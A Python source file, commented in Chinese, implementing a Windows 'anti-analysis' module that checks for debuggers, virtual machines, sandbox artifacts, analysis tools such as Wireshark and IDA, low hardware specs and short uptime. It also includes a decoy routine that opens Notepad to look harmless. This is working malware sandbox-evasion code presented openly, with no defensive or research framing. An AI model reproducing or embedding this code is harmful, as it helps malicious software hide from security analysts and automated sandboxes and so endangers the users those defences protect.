# -*- coding: utf-8 -*-
"""
反分析检测模块 — v4.0
检测沙箱/虚拟机/调试器环境，零第三方依赖。
"""
import ctypes
import ctypes.wintypes
import os
import subprocess
from typing import Dict, Tuple


class AntiAnalysis:
    """反分析环境检测器。"""

    SANDBOX_MAC_PREFIXES = [
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",  # VMware
        "08:00:27", "0A:00:27",  # VirtualBox
        "00:03:FF", "00:15:5D",  # Hyper-V
        "52:54:00", "00:16:3E", "00:1A:4A",  # QEMU/Xen
    ]

    ANALYSIS_PROCESSES = [
        "wireshark.exe", "procmon.exe", "procmon64.exe",
        "procexp.exe", "procexp64.exe", "ollydbg.exe",
        "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
        "windbg.exe", "dnspy.exe", "fiddler.exe",
        "pestudio.exe", "processhacker.exe",
    ]

    SANDBOX_USERNAMES = [
        "sandbox", "malware", "maltest", "virus",
        "sample", "cuckoo", "vmware", "analyst",
    ]

    SANDBOX_FILES = [
        r"C:\agent\agent.pyw", r"C:\sandbox", r"C:\cuckoo",
    ]

    def __init__(self, min_cpu=2, min_ram_gb=2.0,
                 min_disk_gb=50.0, min_uptime_min=12.0):
        self.min_cpu = max(1, min_cpu)
        self.min_ram_gb = max(0.5, min_ram_gb)
        self.min_disk_gb = max(1.0, min_disk_gb)
        self.min_uptime_min = max(0, min_uptime_min)
        self._results: Dict[str, Tuple[bool, str]] = {}

    def is_analysis_environment(self) -> bool:
        """执行全部检测，返回 True 表示可能处于分析环境。"""
        self._results.clear()
        checks = [
            ("debugger", self.check_debugger),
            ("remote_debugger", self.check_remote_debugger),
            ("cpu_cores", self.check_cpu_cores),
            ("ram_size", self.check_ram_size),
            ("disk_size", self.check_disk_size),
            ("uptime", self.check_uptime),
            ("mac_address", self.check_mac_address),
            ("vm_artifacts", self.check_vm_artifacts),
            ("analysis_tools", self.check_analysis_tools),
            ("sandbox_username", self.check_sandbox_username),
            ("sandbox_files", self.check_sandbox_files),
        ]
        sus = 0
        for name, fn in checks:
            try:
                is_sus, detail = fn()
                self._results[name] = (is_sus, detail)
                if is_sus:
                    sus += 1
            except Exception as e:
                self._results[name] = (False, f"error: {e}")

        if self._results.get("debugger", (False,))[0]:
            return True
        if self._results.get("remote_debugger", (False,))[0]:
            return True
        return sus >= 3

    def get_results(self) -> Dict[str, Tuple[bool, str]]:
        return dict(self._results)

    @staticmethod
    def decoy_action():
        """打开记事本作为良性诱饵。"""
        try:
            subprocess.Popen(["notepad.exe"],
                             creationflags=subprocess.CREATE_NEW_CONSOLE)
        except Exception:
            pass

    # --- 单项检测 ---

    def check_debugger(self) -> Tuple[bool, str]:
        try:
            r = ctypes.windll.kernel32.IsDebuggerPresent()
            return (bool(r), f"IsDebuggerPresent={r}")
        except Exception:
            return (False, "API不可用")

    def check_remote_debugger(self) -> Tuple[bool, str]:
        try:
            flag = ctypes.c_int(0)
            h = ctypes.windll.kernel32.GetCurrentProcess()
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                h, ctypes.byref(flag))
            return (bool(flag.value), f"Remote={flag.value}")
        except Exception:
            return (False, "API不可用")

    def check_cpu_cores(self) -> Tuple[bool, str]:
        cores = os.cpu_count() or 1
        return (cores < self.min_cpu, f"cores={cores}")

    def check_ram_size(self) -> Tuple[bool, str]:
        try:
            class MEMSTAT(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            s = MEMSTAT()
            s.dwLength = ctypes.sizeof(MEMSTAT)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(s))
            gb = s.ullTotalPhys / (1024**3)
            return (gb < self.min_ram_gb, f"ram={gb:.1f}GB")
        except Exception:
            return (False, "检测失败")

    def check_disk_size(self) -> Tuple[bool, str]:
        try:
            total = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p("C:\\"), None,
                ctypes.byref(total), None)
            gb = total.value / (1024**3)
            return (gb < self.min_disk_gb, f"disk={gb:.0f}GB")
        except Exception:
            return (False, "检测失败")

    def check_uptime(self) -> Tuple[bool, str]:
        try:
            tick = ctypes.windll.kernel32.GetTickCount64()
            mins = tick / 1000 / 60
            return (mins < self.min_uptime_min, f"uptime={mins:.1f}min")
        except Exception:
            return (False, "检测失败")

    def check_mac_address(self) -> Tuple[bool, str]:
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join(f'{(mac >> (8*(5-i))) & 0xFF:02X}'
                               for i in range(6))
            prefix = mac_str[:8].upper()
            for p in self.SANDBOX_MAC_PREFIXES:
                if prefix == p.upper():
                    return (True, f"MAC={mac_str} match {p}")
            return (False, f"MAC={mac_str}")
        except Exception:
            return (False, "检测失败")

    def check_vm_artifacts(self) -> Tuple[bool, str]:
        found = []
        try:
            import winreg
            for hive, path in [
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\VMware, Inc.\VMware Tools"),
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
            ]:
                try:
                    k = winreg.OpenKey(hive, path)
                    winreg.CloseKey(k)
                    found.append(path)
                except FileNotFoundError:
                    pass
        except Exception:
            pass
        vm_files = [
            r"C:\Windows\System32\drivers\vmhgfs.sys",
            r"C:\Windows\System32\drivers\vboxdrv.sys",
        ]
        for f in vm_files:
            if os.path.exists(f):
                found.append(f)
        return (len(found) > 0, ", ".join(found) or "无VM特征")

    def check_analysis_tools(self) -> Tuple[bool, str]:
        found = []
        try:
            out = subprocess.check_output(
                ["tasklist", "/FO", "CSV", "/NH"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=5).decode("gbk", errors="ignore").lower()
            for p in self.ANALYSIS_PROCESSES:
                if p.lower() in out:
                    found.append(p)
        except Exception:
            pass
        return (len(found) > 0,
                f"found: {','.join(found)}" if found else "clean")

    def check_sandbox_username(self) -> Tuple[bool, str]:
        user = os.environ.get("USERNAME", "").lower()
        comp = os.environ.get("COMPUTERNAME", "").lower()
        for n in self.SANDBOX_USERNAMES:
            if user == n or comp == n:
                return (True, f"user={user},comp={comp}")
        return (False, f"user={user},comp={comp}")

    def check_sandbox_files(self) -> Tuple[bool, str]:
        found = [p for p in self.SANDBOX_FILES if os.path.exists(p)]
        return (len(found) > 0,
                f"found: {','.join(found)}" if found else "clean")
